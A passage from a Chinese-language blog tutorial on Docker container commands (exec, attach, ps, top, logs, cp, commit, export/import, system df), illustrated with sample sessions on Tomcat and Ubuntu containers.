webapps.dist</span><br></pre></td></tr></table></figure><p>可以发现多了一个webapps.dist，原本应该访问webapps文件的，但资源都放在dist里，我们需要移动一下文件,因为之前启动过一个tom3，我们用新命令exec来进入改一下文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it tom3 /bin/bash</span><br><span class="line">root@e85341ca6a4a:/usr/local/tomcat# rm -rf webapps</span><br><span class="line">root@e85341ca6a4a:/usr/local/tomcat# ls</span><br><span class="line">BUILDING.txt     NOTICE         RUNNING.txt  include  native-jni-lib  work</span><br><span class="line">CONTRIBUTING.md  README.md      bin          lib      temp</span><br><span class="line">LICENSE          RELEASE-NOTES  conf         logs     webapps.dist</span><br><span class="line">root@e85341ca6a4a:/usr/local/tomcat# mv webapps.dist/ webapps</span><br><span class="line">root@e85341ca6a4a:/usr/local/tomcat# ls</span><br><span class="line">BUILDING.txt     NOTICE         RUNNING.txt  include  native-jni-lib  work</span><br><span class="line">CONTRIBUTING.md  README.md      bin          lib      temp</span><br><span class="line">LICENSE          RELEASE-NOTES  conf         logs     webapps</span><br></pre></td></tr></table></figure><p>现在webapps里面有东西，再重新访问试试，发现可以了</p><p><img src="/../image/image-20240303152829813.png" alt="image-20240303152829813"></p><p>对于高板本的问题，主要是webapps的目录是空的，需要移过去</p><h3 id="容器退出命令"><a href="#容器退出命令" class="headerlink" title="容器退出命令"></a>容器退出命令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rm -f $(docker ps -a)强制删除全部容器</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exit </span><br><span class="line">ctrl p + q</span><br></pre></td></tr></table></figure><h3 id="docker-exec"><a href="#docker-exec" class="headerlink" title="docker exec"></a>docker exec</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND             CREATED          STATUS          PORTS                                       NAMES</span><br><span class="line">fc32e8b34259   tomcat:8.5.49   &quot;catalina.sh run&quot;   22 minutes ago   Up 22 minutes   0.0.0.0:8081-&gt;8080/tcp, :::8081-&gt;8080/tcp   tom</span><br><span class="line">[root@localhost ~]# docker exec -it tom /bin/bash</span><br><span class="line">root@fc32e8b34259:/usr/local/tomcat# exit</span><br><span class="line">exit</span><br><span class="line">[root@localhost ~]# docker ps</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND             CREATED          STATUS          PORTS                                       NAMES</span><br><span class="line">fc32e8b34259   tomcat:8.5.49   &quot;catalina.sh run&quot;   22 minutes ago   Up 22 minutes   0.0.0.0:8081-&gt;8080/tcp, :::8081-&gt;8080/tcp   tom</span><br></pre></td></tr></table></figure><p>可以看到不影响容器的状态</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker exec --help</span><br><span class="line"></span><br><span class="line">Usage:  docker exec [OPTIONS] CONTAINER COMMAND [ARG...]</span><br><span class="line"></span><br><span class="line">Execute a command in a running container</span><br><span class="line"></span><br><span class="line">Aliases:</span><br><span class="line">  docker container exec, docker exec</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  - d, --detach               Detached mode: run command in the background  --后台运行，分离模式</span><br><span class="line">      --detach-keys string   Override the key sequence for detaching a container --指定别的快捷键组合替代ctrl p q</span><br><span class="line">  -e, --env list             Set environment variables 设置环境变量</span><br><span class="line">      --env-file list        Read in a file of environment variables  文件形式配置环境变量</span><br><span class="line">  -i, --interactive          Keep STDIN open even if not attached  交互方式</span><br><span class="line">      --privileged           Give extended privileges to the command  扩展特权</span><br><span class="line">  -t, --tty    伪客户端              Allocate a pseudo-TTY</span><br><span class="line">  -u, --user string     有的容器需要身份认证     Username or UID (format: &quot;&lt;name|uid&gt;[:&lt;group|gid&gt;]&quot;)</span><br><span class="line">  -w, --workdir string       Working directory inside the container 设置工作目录</span><br></pre></td></tr></table></figure><p>基本在docker run里都有</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker exec -w /root -it tom /bin/bash</span><br><span class="line">root@fc32e8b34259:~# pwd</span><br><span class="line">/root</span><br></pre></td></tr></table></figure><p>有时候需要查看容器的ip，我们也可以不用进去，把bash换成你想执行的命令即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker exec -it tom ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">16: eth0@if17: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default</span><br><span class="line">    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">[root@localhost ~]# docker exec -it tom pwd</span><br><span class="line">/usr/local/tomcat</span><br></pre></td></tr></table></figure><h3 id="docker-attach"><a href="#docker-attach" class="headerlink" title="docker attach"></a>docker attach</h3><p>和exec类似,但对tomcat有例外，进不去</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker run --name buntu -it ubuntu /bin/bash</span><br><span class="line">root@0c5e1d974b26:/# [root@localhost ~]#</span><br><span class="line">[root@localhost ~]#</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND             CREATED          STATUS          PORTS                                       NAMES</span><br><span class="line">0c5e1d974b26   ubuntu          &quot;/bin/bash&quot;         17 seconds ago   Up 15 seconds                                               buntu</span><br><span class="line">fc32e8b34259   tomcat:8.5.49   &quot;catalina.sh run&quot;   42 minutes ago   Up 42 minutes   0.0.0.0:8081-&gt;8080/tcp, :::8081-&gt;8080/tcp   tom</span><br><span class="line">[root@localhost ~]# docker exec -it buntu /bin/bash</span><br><span class="line">root@0c5e1d974b26:/# exit</span><br><span class="line">exit</span><br><span class="line">[root@localhost ~]# docker attach buntu</span><br><span class="line">root@0c5e1d974b26:/# ls</span><br><span class="line">bin   dev  home  lib32  libx32  mnt  proc  run   srv  tmp  var</span><br><span class="line">boot  etc  lib   lib64  media   opt  root  sbin  sys  usr</span><br><span class="line">root@0c5e1d974b26:/# exit</span><br><span class="line">exit</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND             CREATED              STATUS                     PORTS                                       NAMES</span><br><span class="line">0c5e1d974b26   ubuntu          &quot;/bin/bash&quot;         About a minute ago   Exited (0) 9 seconds ago                                               buntu</span><br><span class="line">fc32e8b34259   tomcat:8.5.49   &quot;catalina.sh run&quot;   43 minutes ago       Up 43 minutes              0.0.0.0:8081-&gt;8080/tcp, :::8081-&gt;8080/tcp   tom</span><br></pre></td></tr></table></figure><p>可以看到docker exec 退出后进程还在，但docker attach退出后，进程也退出了，说明exec是创建新的进程来操作，而attach是进入到本体进程去操作，退出后，就都退出了，但docker attach进不去tomcat</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker attach tom,只会流个光标闪烁，但此时你退出后tomcat也退出了</span><br><span class="line">[root@localhost ~]# docker attach --help</span><br><span class="line"></span><br><span class="line">Usage:  docker attach [OPTIONS] CONTAINER</span><br><span class="line"></span><br><span class="line">Attach local standard input, output, and error streams to a running container</span><br><span class="line"></span><br><span class="line">Aliases:</span><br><span class="line">  docker container attach, docker attach</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">      --detach-keys string   Override the key sequence for detaching a container</span><br><span class="line">      --no-stdin             Do not attach STDIN 键盘输入不起作用，默认false</span><br><span class="line">      --sig-proxy            Proxy all received signals to the process (default true) 接收的信号代理到进程</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker start buntu</span><br><span class="line">buntu</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND             CREATED             STATUS                        PORTS     NAMES</span><br><span class="line">0c5e1d974b26   ubuntu          &quot;/bin/bash&quot;         26 minutes ago      Up 3 seconds                            buntu</span><br></pre></td></tr></table></figure><p>因为ubuntu的cmd是bash，是命令行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker exec -it tom /bin/bash</span><br><span class="line">root@fc32e8b34259:/usr/local/tomcat# cd logs</span><br><span class="line">root@fc32e8b34259:/usr/local/tomcat/logs# ls</span><br><span class="line">catalina.2024-03-03.log  host-manager.2024-03-03.log  localhost.2024-03-03.log  localhost_access_log.2024-03-03.txt  manager.2024-03-03.log</span><br><span class="line">root@fc32e8b34259:/usr/local/tomcat/logs# cat localhost_access_log.2024-03-03.txt</span><br><span class="line">192.168.174.1 - - [03/Mar/2024:09:05:56 +0000] &quot;GET / HTTP/1.1&quot; 200 11215</span><br></pre></td></tr></table></figure><p>在tomcat中启停日志的信息会保存到catalina.—.log，访问时这个文件不会变，只有启动关闭时才会变化，然后其中一个参数catalina.sh和下面这个命令差不多</p><p><strong>tail -f filename</strong> 会把 filename 文件里的最尾部的内容显示在屏幕上，并且不断刷新，只要 filename 更新就可以看到最新的文件内容。</p><p><strong>命令格式：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tail [参数] [文件]  </span><br></pre></td></tr></table></figure><p><strong>参数：</strong></p><ul><li>-f 循环读取</li><li>-q 不显示处理信息</li><li>-v 显示详细的处理信息</li><li>-c&lt;数目&gt; 显示的字节数</li><li>-n&lt;行数&gt; 显示文件的尾部 n 行内容</li><li>–pid&#x3D;PID 与-f合用,表示在进程ID,PID死掉之后结束</li><li>-q, –quiet, –silent 从不输出给出文件名的首部</li><li>-s, –sleep-interval&#x3D;S 与-f合用,表示在每次反复的间隔休眠S秒</li></ul><p><strong>实例</strong></p><p>要显示 notes.log 文件的最后 10 行，请输入以下命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tail notes.log         # 默认显示最后 10 行</span><br></pre></td></tr></table></figure><h3 id="docker-ps"><a href="#docker-ps" class="headerlink" title="docker ps"></a>docker ps</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker ps --help</span><br><span class="line">Usage:  docker ps [OPTIONS]</span><br><span class="line">List containers</span><br><span class="line">Aliases:</span><br><span class="line">  docker container ls, docker container list, docker container ps, docker ps</span><br><span class="line">Options:</span><br><span class="line">  -a, --all             Show all containers (default shows just running)</span><br><span class="line">  -f, --filter filter   Filter output based on conditions provided 过滤条件</span><br><span class="line">      --format string   Format output using a custom template: 格式化输出</span><br><span class="line">                        &#x27;table&#x27;:            Print output in table format with</span><br><span class="line">                        column headers (default)</span><br><span class="line">                        &#x27;table TEMPLATE&#x27;:   Print output in table format using</span><br><span class="line">                        the given Go template</span><br><span class="line">                        &#x27;json&#x27;:             Print in JSON format</span><br><span class="line">                        &#x27;TEMPLATE&#x27;:         Print output using the given Go</span><br><span class="line">                        template.</span><br><span class="line">                        Refer to https://docs.docker.com/go/formatting/ for more</span><br><span class="line">                        information about formatting output with templates</span><br><span class="line">  -n, --last int        Show n last created containers (includes all states)</span><br><span class="line">                        (default -1) 显示n个容器</span><br><span class="line">  -l, --latest          Show the latest created container (includes all states) 显示最后一个创建的容器</span><br><span class="line">      --no-trunc        Don&#x27;t truncate output  完整显示输出</span><br><span class="line">  -q, --quiet           Only display container IDs</span><br><span class="line">  -s, --size            Display total file sizes</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="docker-top"><a href="#docker-top" class="headerlink" title="docker top"></a>docker top</h3> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker ps 默认显示正在运行的容器</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND             CREATED       STATUS             PORTS                                       NAMES</span><br><span class="line">fc32e8b34259   tomcat:8.5.49   &quot;catalina.sh run&quot;   6 hours ago   Up About an hour   0.0.0.0:8081-&gt;8080/tcp, :::8081-&gt;8080/tcp   tom</span><br><span class="line">[root@localhost ~]# docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND             CREATED       STATUS                   PORTS                                       NAMES</span><br><span class="line">0c5e1d974b26   ubuntu          &quot;/bin/bash&quot;         6 hours ago   Exited (0) 5 hours ago                                               buntu</span><br><span class="line">fc32e8b34259   tomcat:8.5.49   &quot;catalina.sh run&quot;   6 hours ago   Up About an hour         0.0.0.0:8081-&gt;8080/tcp, :::8081-&gt;8080/tcp   tom</span><br><span class="line">[root@localhost ~]# docker top tom</span><br><span class="line">UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD</span><br><span class="line">root                14342               14323               0                   20:37               pts/0               00:00:07            /usr/local/openjdk-8/bin/java -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /usr/local/tomcat/bin/bootstrap.jar:/usr/local/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/usr/local/tomcat -Dcatalina.home=/usr/local/tomcat -Djava.io.tmpdir=/usr/local/tomcat/temp org.apache.catalina.startup.Bootstrap start</span><br><span class="line">[root@localhost ~]# docker top tom1</span><br><span class="line">UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD</span><br><span class="line">root                16306               16287               0                   21:54               pts/0               00:00:00            /bin/bash</span><br></pre></td></tr></table></figure><p>tty 是“<strong>teletypewriter</strong>”的缩写，但通常被称为终端，它允许您通过将数据（您的输入）传递给系统并显示系统产生的输出来与系统进行交互。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker top --help</span><br><span class="line"></span><br><span class="line">Usage:  docker top CONTAINER [ps OPTIONS]</span><br><span class="line"></span><br><span class="line">Display the running processes of a container</span><br><span class="line"></span><br><span class="line">Aliases:</span><br><span class="line">  docker container top, docker top</span><br></pre></td></tr></table></figure><p>这里的参数是指ps的参数在这里也是可以用的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# ps</span><br><span class="line">   PID TTY          TIME CMD</span><br><span class="line">  3825 pts/1    00:00:00 su</span><br><span class="line">  3831 pts/1    00:00:00 bash</span><br><span class="line">  8640 pts/1    00:00:00 ps</span><br><span class="line">[root@localhost ~]# ps -l</span><br><span class="line">F S   UID    PID   PPID  C PRI  NI ADDR SZ WCHAN  TTY          TIME CMD</span><br><span class="line">4 S     0   3825   3758  0  80   0 - 47494 wait   pts/1    00:00:00 su</span><br><span class="line">4 S     0   3831   3825  0  80   0 - 29143 wait   pts/1    00:00:00 bash</span><br><span class="line">0 R     0   8641   3831  0  80   0 - 37233 -      pts/1    00:00:00 ps</span><br><span class="line">[root@localhost ~]# docker top tom -l</span><br><span class="line">F                   S                   UID                 PID                 PPID                C                   PRI                 NI                  ADDR                SZ                  WCHAN               TTY                 TIME                CMD</span><br><span class="line">4                   S                   0                   8771                8753                80                  80                  0                   -                   546788              futex_              pts/0 </span><br><span class="line">[root@localhost ~]# docker top tom | grep 8753</span><br><span class="line">root                8771                8753                2                   17:02               pts/0               00:00:02            /usr/local/openjdk-8/bin/java -Djava.util.logging.config.file=/usr/local/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /usr/local/tomcat/bin/bootstrap.jar:/usr/local/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/usr/local/tomcat -Dcatalina.home=/usr/local/tomcat -Djava.io.tmpdir=/usr/local/tomcat/temp org.apache.catalina.startup.Bootstrap start</span><br></pre></td></tr></table></figure><h3 id="docker启停"><a href="#docker启停" class="headerlink" title="docker启停"></a>docker启停</h3><p>启动</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker start xx</span><br><span class="line">docker restart xx</span><br></pre></td></tr></table></figure><p>停止</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker stop xx优雅停止</span><br><span class="line">docker kill xx强制停止</span><br><span class="line">[root@localhost ~]# docker stop/kill $(docker ps -q)</span><br><span class="line">c17bb9e779f4</span><br><span class="line">0c5e1d974b26</span><br><span class="line">fc32e8b34259</span><br></pre></td></tr></table></figure><p>补充：pause&#x2F;unpause</p><p>日志监视不到，容器并没有暂停，但也访问不了</p><p>docker pause xx这个暂停的是容器对外提供的服务</p><h3 id="docker-logs"><a href="#docker-logs" class="headerlink" title="docker logs"></a>docker logs</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker logs --help</span><br><span class="line"></span><br><span class="line">Usage:  docker logs [OPTIONS] CONTAINER</span><br><span class="line"></span><br><span class="line">Fetch the logs of a container</span><br><span class="line"></span><br><span class="line">Aliases:</span><br><span class="line">  docker container logs, docker logs</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">      --details        Show extra details provided to logs</span><br><span class="line">  -f, --follow         Follow log output</span><br><span class="line">      --since string   Show logs since timestamp (e.g.</span><br><span class="line">                       &quot;2013-01-02T13:23:37Z&quot;) or relative (e.g. &quot;42m&quot;</span><br><span class="line">                       for 42 minutes)</span><br><span class="line">  -n, --tail string    Number of lines to show from the end of the logs</span><br><span class="line">                       (default &quot;all&quot;)</span><br><span class="line">  -t, --timestamps     Show timestamps</span><br><span class="line">      --until string   Show logs before a timestamp (e.g.</span><br><span class="line">                       &quot;2013-01-02T13:23:37Z&quot;) or relative (e.g. &quot;42m&quot;</span><br><span class="line">                       for 42 minutes)</span><br><span class="line">                    </span><br><span class="line">docker logs --since &quot;2024-03-04&quot; --tail 3 buntu  这里的日期也可以换成10s,10h，since也可以换成until </span><br><span class="line">docker logs -f -n 10 tom 这个f可以用来查看容器动态的日志</span><br></pre></td></tr></table></figure><h3 id="docker-cp"><a href="#docker-cp" class="headerlink" title="docker cp"></a>docker cp</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker cp --help</span><br><span class="line"></span><br><span class="line">Usage:  docker cp [OPTIONS] CONTAINER:SRC_PATH DEST_PATH|-</span><br><span class="line">        docker cp [OPTIONS] SRC_PATH|- CONTAINER:DEST_PATH</span><br><span class="line"></span><br><span class="line">Copy files/folders between a container and the local filesystem</span><br><span class="line"></span><br><span class="line">Use &#x27;-&#x27; as the source to read a tar archive from stdin</span><br><span class="line">and extract it to a directory destination in a container.</span><br><span class="line">Use &#x27;-&#x27; as the destination to stream a tar archive of a</span><br><span class="line">container source to stdout.</span><br><span class="line"></span><br><span class="line">Aliases:</span><br><span class="line">  docker container cp, docker cp</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -a, --archive       Archive mode (copy all uid/gid information)</span><br><span class="line">  -L, --follow-link   Always follow symbol link in SRC_PATH</span><br><span class="line">  -q, --quiet         Suppress progress output during copy. Progress</span><br><span class="line">                      output is automatically suppressed if no terminal</span><br><span class="line">                      is attached</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost worksp]# ls</span><br><span class="line">my.tar  new.tar  test.c</span><br><span class="line">[root@localhost worksp]# docker cp my.tar buntu:/root</span><br><span class="line">Successfully copied 318MB to buntu:/root</span><br><span class="line">[root@localhost worksp]# docker exec -it buntu /bin/bash</span><br><span class="line">root@0c5e1d974b26:/# cd /root</span><br><span class="line">root@0c5e1d974b26:~# ls</span><br><span class="line">my.tar</span><br></pre></td></tr></table></figure><p><strong>但不支持容器间拷贝</strong></p><p><strong>tips:sudo 与 su 两个命令的最大区别是：</strong></p><p>sudo 命令需要输入当前用户的密码，su 命令需要输入 root 用户的密码。另外一个区别是其默认行为，sudo 命令只允许使用提升的权限运行单个命令，而 su 命令会启动一个新的 shell，同时允许使用 root 权限运行尽可能多的命令，直到明确退出登录。</p><h3 id="docker-commit"><a href="#docker-commit" class="headerlink" title="docker commit"></a>docker commit</h3><p>centos ifconfig用不了可以用yum安装net-tools</p><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">yum install -y net-tools</span><br></pre></td></tr></table></figure><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker commit --help</span><br><span class="line"></span><br><span class="line">Usage:  docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]</span><br><span class="line">tag叫什么都行，如果这个repository和tag都没有命名，默认是null，就成悬虚镜像了</span><br><span class="line">Create a new image from a container&#x27;s changes</span><br><span class="line"></span><br><span class="line">Aliases:</span><br><span class="line">  docker container commit, docker commit</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -a, --author string    Author (e.g., &quot;John Hannibal Smith</span><br><span class="line">                         &lt;hannibal@a-team.com&gt;&quot;)作者</span><br><span class="line">  -c, --change list      Apply Dockerfile instruction to the created image  可以增加指令，不常用</span><br><span class="line">  -m, --message string   Commit message提交</span><br><span class="line">  -p, --pause            Pause container during commit (default true) 暂停容器，up-&gt;暂停，默认时true </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker commit -a &quot;youzipii &lt;123@163.com&gt;&quot; -m &quot;Added net-tools&quot; ct1 centos7:net-tools</span><br><span class="line">sha256:ee655f40750fcdbee0c3fac1b6f7ffdf2b19c862bf4d4c7a0e52fc8930d52e01</span><br><span class="line">[root@localhost ~]# docker images</span><br><span class="line">REPOSITORY   TAG         IMAGE ID       CREATED         SIZE</span><br><span class="line">centos7      net-tools   ee655f40750f   9 seconds ago   445MB</span><br><span class="line">[root@localhost ~]# docker inspect ee655f40750f可以看详细信息元数据</span><br><span class="line">开起来看看有没有net-tools</span><br><span class="line">[root@localhost ~]# docker run --name ct2 -it centos7:net-tools</span><br><span class="line">[root@c789c7b87faa /]# ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255</span><br></pre></td></tr></table></figure><p><strong>tips：删除悬虚镜像</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker image prune</span><br><span class="line">WARNING! This will remove all dangling images.</span><br><span class="line">Are you sure you want to continue? [y/N] y</span><br><span class="line">Deleted Images:</span><br><span class="line">deleted: sha256:6c0ad715431faaa5ef68eecdc2a3cd489b66b6a765fb43775bb5376179d54138</span><br><span class="line">Total reclaimed space: 0B</span><br></pre></td></tr></table></figure><h2 id="容器导入导出"><a href="#容器导入导出" class="headerlink" title="容器导入导出"></a>容器导入导出</h2><h3 id="导出xport"><a href="#导出xport" class="headerlink" title="导出xport"></a>导出xport</h3><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker export --help</span><br><span class="line"></span><br><span class="line">Usage:  docker export [OPTIONS] CONTAINER</span><br><span class="line"></span><br><span class="line">Export a container&#x27;s filesystem as a tar archive</span><br><span class="line"></span><br><span class="line">Aliases:</span><br><span class="line">  docker container export, docker export</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -o, --output string   Write to a file, instead of STDOUT</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker export -o tom1-ex.tar tom1</span><br><span class="line">[root@localhost ~]# ls</span><br><span class="line">anaconda-ks.cfg  Downloads             mycmd            Public       Videos</span><br><span class="line">Desktop          initial-setup-ks.cfg  original-ks.cfg  Templates    worksp</span><br><span class="line">Documents        Music                 Pictures         tom1-ex.tar</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="导入import"><a href="#导入import" class="headerlink" title="导入import"></a>导入import</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker import --help</span><br><span class="line"></span><br><span class="line">Usage:  docker import [OPTIONS] file|URL|- [REPOSITORY[:TAG]]</span><br><span class="line"></span><br><span class="line">Import the contents from a tarball to create a filesystem image</span><br><span class="line"></span><br><span class="line">Aliases:</span><br><span class="line">  docker image import, docker import</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -c, --change list       Apply Dockerfile instruction to the created image</span><br><span class="line">  -m, --message string    Set commit message for imported image</span><br><span class="line">      --platform string   Set platform if server is multi-platform capable</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker import tom1-ex.tar tom8:import</span><br><span class="line">sha256:3c91db73c82f48199d9cb1c805d9f80c1da963736217573d33228067e50395f3</span><br><span class="line">[root@localhost ~]# docker images</span><br><span class="line">REPOSITORY   TAG         IMAGE ID       CREATED          SIZE</span><br><span class="line">tom8         import      3c91db73c82f   4 seconds ago    499MB</span><br><span class="line">tomcat       8.5.49      6408fdc94212   4 years ago      507MB</span><br></pre></td></tr></table></figure><p>变小了，是因为有些历史记录，描述等被删除了，同样，如果不指定，又会多一个悬虚镜像</p><h3 id="与save-、load对比"><a href="#与save-、load对比" class="headerlink" title="与save 、load对比"></a>与save 、load对比</h3><ul><li><p>save和export</p><p>分别作用于镜像和容器，export一次只能导出一个容器，save可以一次对多个镜像导出</p><p>export的小（合并后的，快照，原有的历史记录等描述性信息会被丢掉），save是原封不动得保留下来</p></li><li><p>import与load</p><p>import导入的是容器包，load加载的是镜相包，但最终都会恢复为镜像</p><p>import恢复的为镜像只包含当前镜像一层，load恢复的镜像与原来分层的是完全相同的（imageid相同）</p><p>import恢复的镜像就是新购剑的镜像，id与原镜像不同。、</p><p>import 可以为导入的镜像指定<repository>与<tag>，load 加载的镜像不能指定。</p></li></ul><h3 id="与docker-commit-的对比"><a href="#与docker-commit-的对比" class="headerlink" title="与docker commit 的对比"></a>与docker commit 的对比</h3><ul><li>相同点:docker export+docker import会将一个容器变为一个镜像，docker commit 也可以将一个容器变一个镜像。”</li><li>不同点:docker export+docker import 恢复的镜像仅包含原容器生成的一层分层.commit 生成的镜像中包含容器的原镜像的所有分层信息。”</li></ul><h2 id="docker-system-命令集"><a href="#docker-system-命令集" class="headerlink" title="docker system 命令集"></a>docker system 命令集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ docker system --<span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Usage:  docker system COMMAND</span><br><span class="line"></span><br><span class="line">Manage Docker</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">  <span class="built_in">df</span>          Show docker disk usage 查看当前磁盘使用情况</span><br><span class="line">  events      Get real time events from the server</span><br><span class="line">  info        Display system-wide information</span><br><span class="line">  prune       Remove unused data</span><br><span class="line"></span><br><span class="line">Run <span class="string">&#x27;docker system COMMAND --help&#x27;</span> <span class="keyword">for</span> more information on a <span class="built_in">command</span>.</span><br></pre></td></tr></table></figure><h3 id="df"><a href="#df" class="headerlink" title="df"></a>df</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ docker system df --help</span><br><span class="line"></span><br><span class="line">Usage:  docker system df [OPTIONS]</span><br><span class="line"></span><br><span class="line">Show docker disk usage</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">      --format string   Format output using a custom template:</span><br><span class="line">                        &#x27;table&#x27;:            Print output in table format</span><br><span class="line">                        with column headers (default)</span><br><span class="line">                        &#x27;table TEMPLATE&#x27;:   Print output in table format</span><br><span class="line">                        using the given Go template</span><br><span class="line">                        &#x27;json&#x27;:             Print in JSON format</span><br><span class="line">                        &#x27;TEMPLATE&#x27;:         Print output using the given</span><br><span class="line">                        Go template.</span><br><span class="line">                        Refer to https://docs.docker.com/go/formatting/</span><br><span class="line">                        for more information about formatting output with</span><br><span class="line">                        templates</span><br><span class="line">  -v, --verbose         Show detailed information on space usage</span><br><span class="line">  [root@localhost ~]# docker system df</span><br><span class="line">TYPE            TOTAL     ACTIVE    SIZE      RECLAIMABLE</span><br><span class="line">Images          10        4         2.784GB   2.036GB (73%)</span><br><span class="line">Containers      5         0         559.3MB   559.3MB (100%)</span><br><span class="line">Local Volumes   0         0         0B        0B</span><br><span class="line">Build Cache     0         0         0B        0B</span><br></pre></td></tr></table></figure><h3 id="docker-system-enents"><a href="#docker-system-enents" class="headerlink" title="docker system enents"></a>docker system enents</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# docker system events --help</span><br><span class="line"></span><br><span class="line">Usage:  docker system events [OPTIONS]</span><br><span class="line"></span><br><span class="line">Get real time events from the server</span><br><span class="line"></span><br><span class="line">Aliases:</span><br><span class="line">  docker system events, docker events</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -f, --filter filter   Filter output based on conditions provided</span><br><span class="line">      --format string   Format output using a custom template:</span><br><span class="line">                        &#x27;json&#x27;:             Print in JSON format</span><br><span class="line">                        &#x27;TEMPLATE&#x27;:         Print output using the given</span><br><span class="line">                        Go template.</span><br><span class="line">                        Refer to 